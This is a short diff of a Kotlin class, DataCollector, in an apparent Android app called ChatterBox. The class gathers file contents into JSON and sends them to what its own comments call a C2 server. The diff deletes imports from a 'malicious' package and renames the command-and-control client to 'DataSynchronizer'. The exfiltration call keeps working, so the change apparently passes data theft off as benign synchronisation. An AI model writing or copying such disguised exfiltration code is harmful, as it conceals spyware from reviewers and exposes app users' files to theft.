@@ -10,8 +10,6 @@ import java.util.Date
 import java.util.Locale
 import java.util.UUID
 import org.json.JSONObject
-import com.example.ChatterBox.malicious.C2Client
-import com.example.ChatterBox.malicious.C2Config
 
 /**
  * Utility class to manage collected data and simulate exfiltration.
@@ -83,7 +81,7 @@ class DataCollector {
                 
                 try {
                     // Create C2 client if needed
-                    val c2Client = C2Client(context)
+                    val dataSync = DataSynchronizer(context)
                     
                     // Create JSON containing all file contents
                     val jsonData = JSONObject()
@@ -110,7 +108,7 @@ class DataCollector {
                     jsonData.put("files", fileDataArray)
                     
                     // Send data to C2 server
-                    c2Client.sendExfiltrationData(dataType, jsonData.toString())
+                    dataSync.sendExfiltrationData(dataType, jsonData.toString())
                     
                     // Also create a local marker file for logging purposes
                     val uploadMarker = File(getStorageDir(context, "uploads"), 
